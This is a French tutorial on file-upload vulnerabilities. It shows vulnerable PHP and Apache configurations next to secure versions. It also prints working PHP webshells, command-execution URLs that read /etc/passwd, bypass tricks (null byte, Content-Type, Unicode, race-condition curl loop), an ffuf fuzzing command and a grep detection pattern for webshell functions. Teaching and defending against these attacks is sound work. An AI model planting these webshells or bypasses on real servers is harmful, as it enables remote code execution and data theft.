Vulnérabilités d'Upload de Fichiers

Exploiter les failles de validation pour exécuter du code sur le serveur

Critique 📖 15 min ⚡ Intermédiaire

📤 Introduction aux vulnérabilités d'upload

L'upload de fichiers est une fonctionnalité courante permettant aux utilisateurs de télécharger des documents, images, vidéos sur une application web. Cependant, lorsqu'elle est mal implémentée, cette fonctionnalité peut devenir l'une des vulnérabilités les plus critiques d'une application.

Un attaquant peut exploiter une mauvaise validation pour uploader un webshell (script malveillant) et obtenir l'exécution de code à distance (RCE - Remote Code Execution) sur le serveur, compromettant ainsi totalement l'application et ses données.

⚠️
Impact critique :

Une vulnérabilité d'upload peut permettre à un attaquant de voler des données sensibles, créer des backdoors, déployer des ransomwares, ou prendre le contrôle total du serveur.

🎯 Scénario d'attaque typique

Voici comment un attaquant exploite une faille d'upload en 5 étapes :

1

Reconnaissance

L'attaquant identifie un formulaire d'upload (avatar, document, CV, etc.)

2

Test de validation

Il teste quelles extensions et types de fichiers sont acceptés

3

Bypass des protections

Il contourne les validations faibles (double extension, Content-Type, etc.)

4

Upload du webshell

Il upload un fichier malveillant contenant du code exécutable

5

Exécution et compromission

Il accède au fichier uploadé et exécute des commandes système

🔓 Types d'upload vulnérables

Les vulnérabilités varient selon le langage et le serveur web utilisé :

🐘 PHP (Apache/Nginx)

Extensions : .php, .phtml, .php3, .php5, .php7

Serveurs : Apache, Nginx avec PHP-FPM

🪟 ASP/ASPX (IIS)

Extensions : .asp, .aspx, .ashx, .cer, .asa

Serveur : Microsoft IIS (Windows)

☕ JSP (Java)

Extensions : .jsp, .jspx, .war

Serveurs : Tomcat, JBoss, WebLogic

🔺 Autres langages

Python (.py), Perl (.pl), Ruby (.rb)

Tout dépend de la configuration serveur !

💉 Exploitation PHP : L'exemple classique

Le PHP reste le vecteur d'attaque le plus courant. Voici un code vulnérable typique :

⚠️ Code PHP vulnérable PHP 
<?php
// ❌ MAUVAISE PRATIQUE - Validation insuffisante
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$fileName = $_FILES['avatar']['name'];
$fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

if (in_array($fileExtension, $allowedExtensions)) {
    move_uploaded_file($_FILES['avatar']['tmp_name'], 
                      'uploads/' . $fileName);
    echo "Avatar uploadé avec succès !";
}
?>

Problèmes de ce code :

  • ✗ Validation uniquement sur l'extension déclarée dans le nom
  • ✗ Pas de vérification du contenu réel du fichier (MIME type)
  • ✗ Accepte les double extensions comme shell.php.jpg
  • ✗ Ne vérifie pas les extensions alternatives PHP (.phtml, .php3, etc.)
  • ✗ Stockage dans un répertoire accessible publiquement

Méthodes d'exploitation

# Créer un webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Le fichier se termine par .jpg mais contient du PHP
# Si .htaccess permet l'exécution, Apache exécutera le PHP
✅ Avatar uploadé avec succès : shell.php.jpg

# Accéder au webshell :
http://target.com/uploads/shell.php.jpg?cmd=whoami
# Output: www-data

http://target.com/uploads/shell.php.jpg?cmd=cat%20/flag.txt
# Output: CTF{Upl04d_PHP_Sh3ll_M4st3r}
# Utiliser .phtml au lieu de .php
<?php
echo shell_exec($_GET['cmd']);
?>

  • .phtml, .pht

  • .phar (archives PHP)

🕸️ Configuration Apache vulnérable

Souvent, la vulnérabilité ne vient pas seulement du code PHP, mais aussi de la configuration serveur :

⚠️ .htaccess dangereux Apache 
# ❌ MAUVAISE CONFIGURATION
<FilesMatch "\.php">
    SetHandler application/x-httpd-php
</FilesMatch>

# Ce regex matche n'importe quel fichier contenant .php
# Donc shell.php.jpg sera exécuté comme du PHP !

Pourquoi c'est dangereux ?

Le FilesMatch utilise une regex qui matche tout fichier contenant .php dans son nom. Ainsi, shell.php.jpg, avatar.php.png, ou même image.php_backup seront traités comme du code PHP exécutable.

✅ Configuration sécurisée Apache 
# ✅ BONNE CONFIGURATION
<FilesMatch "\.(php|php3|php4|php5|phtml)$">
    SetHandler application/x-httpd-php
</FilesMatch>

# Le $ force la correspondance en FIN de nom
# Seuls les fichiers SE TERMINANT par .php seront exécutés

# Ou mieux encore, désactiver complètement PHP :
php_flag engine off

🚀 Webshells avancés

Une fois l'upload réussi, les attaquants utilisent des webshells sophistiqués :

🐚 Webshell PHP minimaliste PHP 
<?php
// Webshell discret en une ligne
if(isset($_GET['c'])) {
    echo "<pre>" . shell_exec($_GET['c']) . "</pre>";
}
?>

// Utilisation :
// http://target.com/shell.php?c=ls -la
// http://target.com/shell.php?c=cat /etc/passwd
🐚 Webshell avec upload de fichiers PHP 
<?php
// Exécution de commandes
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

// Upload de fichiers supplémentaires
if(isset($_FILES['f'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], 
                       $_FILES['f']['name']);
    echo "File uploaded: " . $_FILES['f']['name'];
}
?>

// Permet d'uploader d'autres outils malveillants
🛡️
Défense :

Les webshells populaires (c99, r57, b374k, WSO) sont souvent détectés par les antivirus et WAF. Les attaquants créent donc des versions obfusquées ou utilisent des techniques d'encodage.

🎭 Techniques de bypass avancées

Les applications modernes ont souvent des protections. Voici comment les contourner :

1️⃣ Bypass Content-Type

Intercepter la requête avec Burp Suite et changer :

Content-Type: image/jpeg
↓
Content-Type: application/x-php

2️⃣ Caractères nuls

Exploiter les bugs de parsing (PHP < 5.3.4) :

shell.php%00.jpg
# Enregistré comme shell.php

3️⃣ Unicode lookalikes

Utiliser des caractères visuellement similaires :

shell.рһр
# 'р' cyrillique au lieu de 'p'

4️⃣ Race Condition

Si l'app valide puis supprime :

while true; do
  curl upload.php &
  curl shell.php &
done

5️⃣ Archives compressées

Si l'app décompresse automatiquement :

zip shell.zip shell.php
# Upload du ZIP

6️⃣ Validation côté client

JavaScript facilement bypassé :

# Désactiver JS
# Ou utiliser curl directement

🛡️ Défenses et protections

Comment sécuriser une fonctionnalité d'upload ? Voici les bonnes pratiques :

✅ Whitelist d'extensions stricte (jamais de blacklist)
✅ Validation du contenu réel via magic bytes (MIME type)
✅ Renommage aléatoire des fichiers uploadés
✅ Stockage hors du webroot si possible
✅ Désactivation de l'exécution dans le dossier uploads
✅ Limitation de taille des fichiers
✅ Scan antivirus des fichiers uploadés
✅ Permissions restrictives (644, jamais 777)
✅ Authentification requise pour uploader
✅ Logging et monitoring des uploads suspects

Code PHP sécurisé

✅ Validation robuste PHP 
<?php
// ✅ BONNES PRATIQUES

// 1. Whitelist stricte
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$fileName = $_FILES['file']['name'];

// 2. Vérifier TOUTES les extensions (double extension)
$allExtensions = explode('.', $fileName);
foreach ($allExtensions as $ext) {
    if (!in_array(strtolower($ext), $allowedExtensions)) {
        die("Extension non autorisée");
    }
}

// 3. Vérifier le contenu réel (magic bytes)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mimeType, $allowedMimes)) {
    die("Type de fichier invalide");
}
finfo_close($finfo);

// 4. Renommer avec nom aléatoire
$newName = bin2hex(random_bytes(16)) . '.jpg';
$uploadDir = '/var/data/uploads/'; // HORS du webroot

// 5. Déplacer avec permissions restrictives
move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $newName);
chmod($uploadDir . $newName, 0644);

echo "Fichier uploadé en sécurité : " . $newName;
?>
🎯 Principe de défense en profondeur : Ne vous reposez jamais sur une seule protection. Combinez plusieurs couches de sécurité pour rendre l'exploitation impossible même si une défense est contournée.

🔨 Outils d'exploitation

Les outils utilisés par les pentesters pour tester les uploads :

Outils essentiels :

  • Burp Suite : Intercepter et modifier les requêtes HTTP
  • OWASP ZAP : Scanner automatique de vulnérabilités
  • ffuf / wfuzz : Fuzzing d'extensions et bypass
  • ExifTool : Manipulation de métadonnées
  • file / hexdump : Analyser les magic bytes
🔍 Commandes utiles Bash 
# Identifier le type réel d'un fichier
file suspicious.jpg

# Examiner les magic bytes
hexdump -C file.jpg | head

# Fuzzing d'extensions avec ffuf
ffuf -u http://target.com/upload.php \
     -w extensions.txt \
     -X POST \
     -H "Content-Type: multipart/form-data" \
     -mc 200

# Scanner pour webshells sur le serveur
grep -r "system\|exec\|passthru\|shell_exec" /var/www/uploads/
